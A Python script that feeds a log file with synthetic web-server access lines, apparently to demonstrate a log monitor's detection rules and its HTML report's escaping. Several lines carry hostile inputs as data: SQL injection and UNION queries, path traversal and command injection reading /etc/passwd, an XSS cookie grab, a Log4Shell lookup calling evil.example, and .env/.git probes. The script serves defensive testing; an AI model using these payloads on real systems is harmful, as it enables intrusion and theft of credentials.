#!/usr/bin/env python3
"""Feed a live log for the watch-mode demo.

    python tools/demo_feed.py init   FILE   # create FILE with a few normal lines
    python tools/demo_feed.py attack FILE   # append attacks one by one, with pauses
    python tools/demo_feed.py xss    FILE   # write a log holding an XSS payload

Timestamps are "now", so the sliding-window rules fire like on a real server.
"""

import sys
import time
from datetime import datetime, timezone

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0"


def line(ip, method, path, status, ua=UA, size=512):
    ts = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"\n'


def append(path, text, pause=0.0):
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(text)
        fh.flush()
    if pause:
        time.sleep(pause)


def init(path):
    with open(path, "w", encoding="utf-8") as fh:
        for p in ("/", "/index.html", "/products", "/assets/app.css"):
            fh.write(line("198.51.100.17", "GET", p, 200))


def attack(path):
    steps = [
        ("Normal visitor browsing", [line("198.51.100.23", "GET", "/products/42", 200)]),
        ("SQL injection with sqlmap", [
            line("203.0.113.66", "GET", "/products?id=1%27%20OR%20%271%27=%271", 200, "sqlmap/1.8.3"),
            line("203.0.113.66", "GET", "/products?id=1+UNION+SELECT+username,password+FROM+users--", 500, "sqlmap/1.8.3"),
        ]),
        ("Path traversal", [line("198.51.100.200", "GET", "/download?file=../../../../etc/passwd", 400)]),
        ("XSS payload", [line("198.51.100.200", "GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 400)]),
        ("Log4Shell in the User-Agent", [line("192.0.2.150", "GET", "/", 200, "${jndi:ldap://evil.example/a}")]),
        ("Command injection", [line("192.0.2.150", "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", 403, "curl/8.4.0")]),
        ("Secret file probes (.env, .git)", [
            line("203.0.113.77", "GET", "/.env", 404, "gobuster/3.6"),
            line("203.0.113.77", "GET", "/.git/config", 404, "gobuster/3.6"),
        ]),
        ("Web login brute force: 8 wrong passwords", [
            line("198.51.100.99", "POST", "/login", 401, "python-requests/2.32") for _ in range(8)
        ]),
        ("...then the attacker gets in (compromise!)", [
            line("198.51.100.99", "POST", "/login", 302, "python-requests/2.32", 0)
        ]),
    ]
    for title, lines in steps:
        print(f"  -> {title}")
        for ln in lines:
            append(path, ln, 0.15)
        time.sleep(2.0)
    print("  Done. Look at the watch window.")


def xss(path):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(line("198.51.100.200", "GET",
                      "/search?q=<script>alert('If you see this popup, the report is hacked')</script>", 200))
        fh.write(line("198.51.100.200", "GET", "/comment?text=<img src=x onerror=alert(1)>", 200))


if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] not in ("init", "attack", "xss"):
        print(__doc__)
        sys.exit(1)
    {"init": init, "attack": attack, "xss": xss}[sys.argv[1]](sys.argv[2])
